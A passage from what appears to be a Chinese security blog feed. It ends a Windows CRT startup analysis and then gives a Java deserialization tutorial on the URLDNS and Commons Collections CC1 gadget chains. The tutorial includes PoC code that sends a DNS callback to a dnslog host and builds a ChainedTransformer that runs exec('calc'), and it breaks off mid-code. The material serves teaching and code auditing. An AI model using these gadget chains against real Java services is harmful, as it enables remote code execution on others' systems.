<span class="hljs-comment">// variables, then we invoke their initialization for the primary thread</span><br>        <span class="hljs-comment">// used to start the process:</span><br>        _tls_callback_type <span class="hljs-keyword">const</span>* <span class="hljs-keyword">const</span> tls_init_callback = __scrt_get_dyn_tls_init_callback();<br>        <span class="hljs-keyword">if</span> (*tls_init_callback != <span class="hljs-literal">nullptr</span> &amp;&amp; __scrt_is_nonwritable_in_current_image(tls_init_callback))<br>        &#123;<br>            (*tls_init_callback)(<span class="hljs-literal">nullptr</span>, DLL_THREAD_ATTACH, <span class="hljs-literal">nullptr</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// If this module has any thread-local destructors, register the</span><br>        <span class="hljs-comment">// callback function with the Unified CRT to run on exit.</span><br>        _tls_callback_type <span class="hljs-keyword">const</span> * <span class="hljs-keyword">const</span> tls_dtor_callback = __scrt_get_dyn_tls_dtor_callback();<br>        <span class="hljs-keyword">if</span> (*tls_dtor_callback != <span class="hljs-literal">nullptr</span> &amp;&amp; __scrt_is_nonwritable_in_current_image(tls_dtor_callback))<br>        &#123;<br>            _register_thread_local_exe_atexit_callback(*tls_dtor_callback);<br>        &#125;<br><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// Initialization is complete; invoke main...</span><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// 调用main函数</span><br><br>        <span class="hljs-keyword">int</span> <span class="hljs-keyword">const</span> main_result = invoke_main();<br><br>        <span class="hljs-comment">//</span><br>        <span class="hljs-comment">// main has returned; exit somehow...</span><br>        <span class="hljs-comment">//</span><br><br>        <span class="hljs-keyword">if</span> (!__scrt_is_managed_app())<br>            <span class="hljs-built_in">exit</span>(main_result);<br><br>        <span class="hljs-keyword">if</span> (!has_cctor)<br>            _cexit();<br><br>        <span class="hljs-comment">// Finally, we terminate the CRT:</span><br>        __scrt_uninitialize_crt(<span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">return</span> main_result;<br>    &#125;<br>    __except (_seh_filter_exe(GetExceptionCode(), GetExceptionInformation()))<br>    &#123;<br>        <span class="hljs-comment">// Note:  We should never reach this except clause.</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-keyword">const</span> main_result = GetExceptionCode();<br><br>        <span class="hljs-keyword">if</span> (!__scrt_is_managed_app())<br>            _exit(main_result);<br><br>        <span class="hljs-keyword">if</span> (!has_cctor)<br>            _c_exit();<br><br>        <span class="hljs-keyword">return</span> main_result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续跟进<code>invoke_main</code>，发现在这里调用了main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">invoke_main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> main(__argc, __argv, _get_initial_narrow_environment());<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计 反序列化基础案例（一）</title>
    <link href="/2024/02/29/blog0031-5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E6%A1%88%E4%BE%8B%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/02/29/blog0031-5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E6%A1%88%E4%BE%8B%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>本篇文章将会针对URLDNS和CC1、CC6链的利用原理进行分析。</p><span id="more"></span><h1 id="urldns链">URLDNS链</h1><h2 id="环境搭建">1、环境搭建</h2><p>任意环境即可</p><h2 id="调用链分析">2、调用链分析</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br></code></pre></td></tr></table></figure><p>如何分析这样的gadgets，我们明确反序列化漏洞的常规思路</p><ol type="1"><li>入口点，比如readObject</li><li>调用链，readObject中调用了C类的A方法，而其他类（或本身）的同名A方法存在危险操作。也可以依次扩展下去形成链式调用。</li><li>利用存在危险操作的其他类替换预期的C类</li></ol><p>按照这样的思路，我们就可以明确调用链的逻辑。</p><p>在<code>HashMap</code>的<code>readObject</code>中对键值key进行了<code>hash()</code>操作</p><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20240303204930693.png" alt="image-20240303204930693" /></p><p>在hash函数中调用了hashCode，而hashCode函数在URL类中也是存在的</p><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20240303205046243.png" alt="image-20240303205046243" /></p><p>在URL类中的hashCode函数调用了URLStreamHandler实现HashCode</p><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20240303205848868.png" alt="image-20240303205848868" /></p><p>最终发现会对Hostname进行getHostAddress操作，由此我们获取到了一个危险操作。</p><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20240303205158332.png" alt="image-20240303205158332" /></p><h2 id="poc">3、Poc</h2><p>我们在Poc中实现两个操作，序列化和反序列化，由于在put的时候也会调用HashCode，因此我们需要在put之前先设置一个hashCode（确保DNS请求是在反序列化中出现的）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ms08067;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo02</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String Filename = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String url = <span class="hljs-string">&quot;http://&quot;</span> + <span class="hljs-string">&quot;qoanwh.dnslog.cn&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        serialize();<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(Filename)));<br>        Object obj = ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        HashMap&lt;Object, String&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object, String&gt;();<br>        URL url = <span class="hljs-keyword">new</span> URL(Demo02.url);<br><br>        <span class="hljs-comment">// 防止在put的时候造成url请求</span><br>        <span class="hljs-comment">// 反射修改私有变量</span><br>        Class urlClass = url.getClass();<br>        Field hashCode = urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCode.setAccessible(<span class="hljs-keyword">true</span>);<br>        hashCode.set(url, <span class="hljs-number">1</span>);<br><br>        map.put(url, <span class="hljs-string">&quot;admin&quot;</span>);<br><br>        <span class="hljs-comment">// 修改回hashCode=-1, 否则无法触发反序列化</span><br>        hashCode.set(url, -<span class="hljs-number">1</span>);<br><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(Filename));<br>        outputStream.writeObject(map);<br>        System.out.println(<span class="hljs-string">&quot;序列化成功&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="cc1链---transformedmap">CC1链 - TransformedMap</h1><h2 id="环境搭建-1">1、环境搭建</h2><ul><li>jdk不得高于8U71，我这里选用8u65</li><li>commons.collections3.1版本</li></ul><p>Commons Collections 是 Apache Software Foundation 提供的一个开源 Java 类库，旨在提供一组有用的、高效的、易于使用的集合类。它扩展了 Java 标准类库中的集合框架，并提供了许多实用的集合类和算法，以满足日常编程中的各种需求。</p><h2 id="transforomedmap利用分析">2、TransforomedMap利用分析</h2><p>CC1链主要是针对Transformer来进行分析的。</p><p><code>Transformer</code> 接口是 Apache Commons Collections 中的一个接口，用于定义将一个对象转换为另一个对象的转换器。它的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">javaCopy codepublic <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Transformer</span>&lt;<span class="hljs-title">I</span>, <span class="hljs-title">O</span>&gt; </span>&#123;<br>    <span class="hljs-function">O <span class="hljs-title">transform</span><span class="hljs-params">(I input)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，<code>I</code> 是输入类型，<code>O</code> 是输出类型。<code>transform</code> 方法接受一个输入对象，并返回一个经过转换后的输出对象。</p><h3 id="同名方法invokertransformer.transform">2.1、同名方法—InvokerTransformer.transform</h3><p>在InvokerTransformer中存在的transform函数，其中反射涉及到的相应参数我们都可以在构造中实现，因此可以通过反射来实现RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>                <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>基于此，我们就成功找到了Transformer类的可以利用的transformer方法，也就是我们发序列化的终点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo03</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        InvokerTransformer inv = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        inv.transform(Runtime.getRuntime());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="transform的调用链">2.2、transform的调用链</h3><p>在上一步中，我们找到了可利用的同名函数transform，那么接下来的思路就是去找哪里存在可能调用transform的利用点。</p><p>我们使用<code>find usages</code>功能，在<code>TransformedMap</code>类中找到调用transform方法的类。</p><p>我们进一步的分析，发现该类的基本逻辑就是将一个map对象中的Key和Value完成Transform操作。</p><p>构造函数需要调用静态方法来间接调用实现，我们可以通过参数控制相应的键值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>&#125;<br></code></pre></td></tr></table></figure><p>在类中的许多方法都对Key或者Value进行<code>transform</code>操作，我们需要进一步的分析。</p><p>我们选定<code>checkSetValue</code>方法进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">checkSetValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们进一步分析，checkSetValue的调用点，分析发现在MapEntry处调用了这个类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapEntryDecorator</span> </span>&#123;<br><br>    <span class="hljs-comment">/** The parent map */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AbstractInputCheckedMapDecorator parent;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">MapEntry</span><span class="hljs-params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(entry);<br>        <span class="hljs-keyword">this</span>.parent = parent;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">setValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>        value = parent.checkSetValue(value);<br>        <span class="hljs-keyword">return</span> entry.setValue(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以通过遍历MapEntry从而实现chekSetValue的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo03</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>        InvokerTransformer inv = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        <span class="hljs-comment">// inv.transform(Runtime.getRuntime());</span><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-keyword">null</span>, inv);<br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : transformedMap.entrySet()) &#123;<br>            entry.setValue(Runtime.getRuntime());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，我们的链已经完成了一半</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MapEntry</span>.</span></span>setValue<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>checkSetValue<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<br></code></pre></td></tr></table></figure><h3 id="readobject入口点">2.3、readObject入口点</h3><p>调用链的终结一般就是在readObject中完成的，其实合理的方法应该是链子终点逆推的过程中就不断去看看是否存在readObject中利用的可能性。</p><p>我们通过对setValue的寻找，发现在AnnotationInvocationHandler类的readObject方法中存在这样的利用。在此基础上，我们尝试构造这个类。因为AnnotationInvocationHandler不是public类型的类，因此我们只能通过反射去获取这个类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException </span>&#123;<br>    <span class="hljs-comment">// Runtime.getRuntime().exec(&quot;calc&quot;);</span><br>    InvokerTransformer inv = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>    <span class="hljs-comment">// inv.transform(Runtime.getRuntime());</span><br>    HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;Object,Object&gt;();<br>    map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-keyword">null</span>, inv);<br><br>    Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    Constructor&lt;?&gt; declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);<br>    declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>    Object annotationInvocationHandler = declaredConstructor.newInstance(Override.class, transformedMap);<br>    serialize(annotationInvocationHandler);<br>    unserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p>此时我们的问题只剩下</p><ol type="1"><li>Runtime这个类不能被反序列化</li><li>annotationInvocationHandler.setValue对象不是直接可以控制</li></ol><h3 id="runtime的不可序列化">2.4、Runtime的不可序列化</h3><p>Runtime不可序列化，但是我们可以通过transform利用反射来构造对应的实例。</p><p>我们对这段代码进行改造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;<br>    Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<br>        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<br>            <span class="hljs-keyword">null</span>),<span class="hljs-string">&quot;calc&quot;</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure><p>将原本的反射通过transform操作完成了实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取getRuntime</span><br>Method getRuntimeMethod = (Method)<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;).transform(Runtime.class);<br><span class="hljs-comment">// 调用getRuntime</span><br>Runtime r =  (Runtime)(<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;).transform(getRuntimeMethod));<br><span class="hljs-comment">// 调用exec</span><br><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure><p>但是我们发现此时存在的不断调用transform的过程可以使用ChainedTransformer来实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformer);<br>chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p>我们使用新的<code>chainedTransformer</code>来代替之前通过直接Runtime实例对象生成的Transformer</p><h3 id="readobject控制流">2.5、readObject控制流</h3><p>我们回归到readObject接口中，再来分析我们的最后一步。</p><p>可以看到一个是memberValue（可控）的限制，另一个MapEntry对象的setValue内部不可控。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> 